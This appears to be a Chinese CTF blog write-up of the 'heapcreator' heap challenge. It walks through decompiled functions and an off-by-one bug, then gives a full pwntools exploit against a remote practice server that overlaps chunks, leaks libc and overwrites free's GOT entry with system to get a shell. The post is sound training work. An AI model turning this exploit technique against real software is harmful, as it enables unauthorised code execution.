---
layout: post
title:  heapcreator
date:   2021-05-20 00:01:01 +0300
image:  2021-05-20-paper.jpg
tags:   [ctf,Pwn,hitcontraining,ubuntu16,heap,off-by-one]
---

main

```assembly
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+0h] [rbp-10h]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  while ( 1 )
  {
    menu();
    read(0, &buf, 4uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        create_heap();
        break;
      case 2:
        edit_heap();
        break;
      case 3:
        show_heap();
        break;
      case 4:
        delete_heap();
        break;
      case 5:
        exit(0);
        return;
      default:
        puts("Invalid Choice");
        break;
    }
  }
}
```

create

```assembly
unsigned __int64 create_heap()
{
  _QWORD *v0; // rbx
  signed int i; // [rsp+4h] [rbp-2Ch]
  size_t size; // [rsp+8h] [rbp-28h]
  char buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 9; ++i )
  {
    if ( !heaparray[i] )
    {
      heaparray[i] = malloc(0x10uLL);
      if ( !heaparray[i] )
      {
        puts("Allocate Error");
        exit(1);
      }
      printf("Size of Heap : ");
      read(0, &buf, 8uLL);
      size = atoi(&buf);
      v0 = heaparray[i];
      v0[1] = malloc(size);
      if ( !*((_QWORD *)heaparray[i] + 1) )
      {
        puts("Allocate Error");
        exit(2);
      }
      *(_QWORD *)heaparray[i] = size;
      printf("Content of heap:", &buf);
      read_input(*((void **)heaparray[i] + 1), size);
      puts("SuccessFul");
      return __readfsqword(0x28u) ^ v5;
    }
  }
  return __readfsqword(0x28u) ^ v5;
}
```

最多只能申请10个堆块。

在heaparray数组申请了一个堆块，大小为0x10，前0x8保存将要输入的内容的size，在后0x8的位置再申请一个堆块，大小为size，这个指针指向输入的内容。

```assembly
unsigned __int64 edit_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Content of heap : ", &buf);
    read_input(*((void **)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

修改块中的内容。

read_input是自己写的函数，这里显然存在一个off-by-one漏洞可以利用。

```assembly
unsigned __int64 show_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    printf("Size : %ld\nContent : %s\n", *(_QWORD *)heaparray[v1], *((_QWORD *)heaparray[v1] + 1));
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

展示块中的内容。

```assembly
unsigned __int64 delete_heap()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Index :");
  read(0, &buf, 4uLL);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 > 9 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( heaparray[v1] )
  {
    free(*((void **)heaparray[v1] + 1));
    free(heaparray[v1]);
    heaparray[v1] = 0LL;
    puts("Done !");
  }
  else
  {
    puts("No such heap !");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

删除堆块，先free掉存放内容的堆块，因为指向它的指针存放在第一个堆块中，所以这里并不需要将其置0，再free掉保存size和内容的块，并将其指针置0。

思路，因为程序给了很多功能，输出，修改，删除，所以可以通过输出函数泄露地址进而计算出libc的地址。利用修改功能将某个函数的got表中的内容改为system函数的地址，这样在执行这个函数的时候实际上执行的是system函数。

```assembly
#-*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

# io = process("./heapcreator")
io = remote("node3.buuoj.cn", 29266)

def long2int(self,num):
    assert isinstance(num, (int, long))
    return int(num & sys.maxint)

def create(size, content):
    io.recvuntil("Your choice :")
    io.sendline(str(1))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.sendline(content)

def edit(index, content):
    io.recvuntil("Your choice :")
    io.sendline(str(2))
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Content of heap : ")
    io.sendline(content)

def show(index):
    io.recvuntil("Your choice :")
    io.sendline(str(3))
    io.recvuntil("Index :")
    io.sendline(str(index))

def delete(index):
    io.recvuntil("Your choice :")
    io.sendline(str(4))
    io.recvuntil("Index :")
    io.sendline(str(index))

create(0x18,'aaaa')
create(0x10,'bbbb')
# create(0x10,'cccc')
# create(0x10,'/bin/sh')
'''
gdb-peda$ x/100gx 0x023c6000
0x23c6000:	0x0000000000000000	0x0000000000000021 0
0x23c6010:	0x0000000000000018	0x00000000023c6030
0x23c6020:	0x0000000000000000	0x0000000000000021
0x23c6030:	0x0000000a61616161	0x0000000000000000
0x23c6040:	0x0000000000000000	0x0000000000000021 1
0x23c6050:	0x0000000000000010	0x00000000023c6070
0x23c6060:	0x0000000000000000	0x0000000000000021
0x23c6070:	0x0000000a62626262	0x0000000000000000
0x23c6080:	0x0000000000000000
'''

edit(0, "/bin/sh\x00" +"a"*0x10 + "\x41")
'''
gdb-peda$ x/100gx 0x0255f000
0x255f000:	0x0000000000000000	0x0000000000000021
0x255f010:	0x0000000000000018	0x000000000255f030
0x255f020:	0x0000000000000000	0x0000000000000021
0x255f030:	0x0068732f6e69622f	0x6161616161616161
0x255f040:	0x6161616161616161	0x0000000000000041
0x255f050:	0x0000000000000010	0x000000000255f070
0x255f060:	0x0000000000000000	0x0000000000000021
0x255f070:	0x0000000a62626262	0x0000000000000000
0x255f080:	0x0000000000000000	0x0000000000020f81
'''

delete(1)
'''
gdb-peda$ x/100gx 0x021cd000
0x21cd000:	0x0000000000000000	0x0000000000000021 0
0x21cd010:	0x0000000000000018	0x00000000021cd030
0x21cd020:	0x0000000000000000	0x0000000000000021
0x21cd030:	0x0068732f6e69622f	0x6161616161616161
0x21cd040:	0x6161616161616161	0x0000000000000041 1
0x21cd050:	0x0000000000000000	0x00000000021cd070
0x21cd060:	0x0000000000000000	0x0000000000000021
0x21cd070:	0x0000000000000000	0x0000000000000000
0x21cd080:	0x0000000000000000	0x0000000000020f81
'''
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x21cd060 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x21cd040 (overlap chunk with 0x21cd060(freed) )
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x21cd080 (size : 0x20f80) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
'''

free_got = 0x602018
create(0x30, p64(0)*4 + p64(0x30) + p64(free_got))
'''
gdb-peda$ x/100gx 0x00a60000
0xa60000:	0x0000000000000000	0x0000000000000021
0xa60010:	0x0000000000000018	0x0000000000a60030
0xa60020:	0x0000000000000000	0x0000000000000021
0xa60030:	0x0068732f6e69622f	0x6161616161616161
0xa60040:	0x6161616161616161	0x0000000000000041 1->content
0xa60050:	0x0000000000000000	0x0000000000000000
0xa60060:	0x0000000000000000	0x0000000000000000 1->index
0xa60070:	0x0000000000000030	0x0000000000602018
0xa60080:	0x0000000000000000	0x0000000000020f81
'''
# 这样，当我们修改1的内容时， 修改的其实并不是1的content
# 而是free的got表的内容，如果将其改为system的地址
# 调用free其实就是调用了system

show(1)
io.recvuntil("Content : ")
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

libc = LibcSearcher("free", addr)
base = addr - libc.dump("free")
system = base + libc.dump("system")

# 改为system的地址
edit(1, p64(system))

# 剩下的手动free一个块就行了

# gdb.attach(io)
# raw_input()

io.interactive()
```

